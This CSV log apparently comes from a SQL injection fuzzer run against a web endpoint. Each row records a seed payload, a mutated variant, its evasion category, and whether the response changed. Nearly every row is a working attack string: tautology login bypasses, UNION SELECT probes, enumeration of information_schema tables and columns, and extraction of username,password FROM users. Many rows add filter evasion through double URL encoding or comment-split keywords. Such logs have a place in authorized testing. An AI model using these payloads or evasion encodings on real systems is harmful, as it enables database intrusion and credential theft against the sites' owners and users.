root_id,original_sha1,original_preview,best_sha1,input_preview,best_depth,best_category,label,reason,status,length,elapsed,score
seed_00001,356a192b7913b04c54574d18c28d46e6395428ab,1,356a192b7913b04c54574d18c28d46e6395428ab,1,0,seed,NO_EFFECT,NORMAL_BASELINE_MATCH,200,4538,0.00612,30
seed_00002,b6589fc6ab0dc82cf12099d1c2d40ab994e8410c,0,b6589fc6ab0dc82cf12099d1c2d40ab994e8410c,0,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00691,20
seed_00003,7984b0a0e139cabadb5afc7756d473fb34d23819,-1,7984b0a0e139cabadb5afc7756d473fb34d23819,-1,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00708,20
seed_00004,d528fca3b163c05703e88b5285440bec28ecf185,99999999,d528fca3b163c05703e88b5285440bec28ecf185,99999999,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00667,20
seed_00005,a9993e364706816aba3e25717850c26c9cd0d89d,abc,a9993e364706816aba3e25717850c26c9cd0d89d,abc,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00625,20
seed_00006,05dee96964e9c1de4ad1bd25365dc35440f92002,1 OR 1=1,05dee96964e9c1de4ad1bd25365dc35440f92002,1 OR 1=1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4545,0.00849,100
seed_00007,ba0b442ba661ffa94d9feb3d23ef4ec5305ca5d2,1 AND 1=1,ba0b442ba661ffa94d9feb3d23ef4ec5305ca5d2,1 AND 1=1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4546,0.00532,100
seed_00008,673b168232e632e2caf632e407996b79189caebf,1 AND 1=0,673b168232e632e2caf632e407996b79189caebf,1 AND 1=0,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4546,0.00562,100
seed_00009,55e443ba6e9f76db8ad7bc2d0b1c14c9e852ed4c,1' OR '1'='1,55e443ba6e9f76db8ad7bc2d0b1c14c9e852ed4c,1' OR '1'='1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4826,0.0058,100
seed_00010,996aacd6b5ddaf92f8c4a83c59ffb9b3006b6227,1' AND '1'='1,996aacd6b5ddaf92f8c4a83c59ffb9b3006b6227,1' AND '1'='1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4550,0.00563,100
seed_00011,80024d8f5759744d0bc642a280722439b1755a14,' OR 1=1,80024d8f5759744d0bc642a280722439b1755a14,' OR 1=1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,160,0.00504,100
seed_00012,6db581bfaa81c33a2b9af4355950ae2bfcc18384,' OR '1'='1,6db581bfaa81c33a2b9af4355950ae2bfcc18384,' OR '1'='1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4821,0.00613,100
seed_00013,d2c991c52d89dfa64ea7c99b20c9cd926f143383,admin' OR '1'='1,d2c991c52d89dfa64ea7c99b20c9cd926f143383,admin' OR '1'='1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4846,0.0057,100
seed_00014,26cb53c9bd7527a61bf0c3c6e6ca55eebcb379b1,x' OR 1=1 OR 'x'='y,26cb53c9bd7527a61bf0c3c6e6ca55eebcb379b1,x' OR 1=1 OR 'x'='y,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4861,0.00612,100
seed_00015,98b9cd66b831270e1a5de4cf6eb166b517bf961e,"1 UNION SELECT 1,2",23cbe5232997dd63fdc0712ad886f6ed71de7e3f,1%2520UNION%2520SELECT%25201%252C2,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4571,0.00512,100
seed_00016,048cdbedfa70e0817807e5025e371ffd8af4b4f4,"1 UNION SELECT 1,2,3",b286991a61d6f6c0f152e7cf936d5c0e50b800b3,1%2520UNION%2520SELECT%25201%252C2%252C3,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4577,0.00483,100
seed_00017,9137a60a796b3535981073bff6b210bd0d70c276,"1 UNION SELECT user(),2",b1dd372502df4f54e4ff332547ca0bb61e4fbdd6,1%2520UNION%2520SELECT%2520user%2528%2529%252C2,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4584,0.0052,100
seed_00018,bf8eb7c6cb44c5a42ee6a7260665848eb7aa300b,"1 UNION SELECT user(),database()",2b3a3ec65765bbe08745ee3425cd8634399ef1f6,"1 U/**/NION SELEC/**/T us/**/er(),databa/**/se()",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4585,0.00514,100
seed_00019,ce101d352e2b887965df3173310a3fac398b49aa,"1 UNION SELECT username,password FROM users",3142d7c61ef12245436b0b3bf24a26c9ff6032c6,1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4604,0.00538,100
seed_00020,320b58f82b86af71284ff8bc0219ecf94c73f77e,"1 UNION SELECT table_name,2 FROM information_schema.tables",02b0ffa5fa5e22ec0e4fa689fc7bef32d5aa6753,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4619,0.00543,100
seed_00021,34a33f3eaef52b0334e97981bf9ed1a38fac338e,"1 UNION SELECT column_name,2 FROM information_schema.columns",7ebc402804bfbc9755d88047619db3c5e9ee49fc,"1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4613,0.00508,100
seed_00022,796d77d8cc39eff5f9252614eb46e5de906b0158,"1' UNION SELECT 1,2--",d25aac0a9b29d357d9f1dfa3674c3aeb1b3c57d6,1%2527%2520UNION%2520SELECT%25201%252C2--,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4578,0.0053,100
seed_00023,6a99974b629a183cd94c508100ae412857e5a393,"1' UNION SELECT username,password FROM users--",a1de1daf84f69b80b2507a64b8fb3b2c0593a1ba,"1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs--",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,223,0.00491,100
seed_00024,31e53433675779ef63a3a161d1513c549f8c1e0e,"-1' UNION SELECT 1,2,3--",833277dde37e4961edb3ce469f8e471ebd0e0d7c,"-1' UNIO/**/N SELEC/**/T 1,2,3--",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,188,0.00565,100
seed_00025,fa15d0bfa29aaac26f43cdadced0fc296c8644ff,"1 union select null,null",25ec68c4b12caf0a22b201e7ef09c6924b22f701,1%2520union%2520select%2520null%252Cnull,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4577,0.0053,100
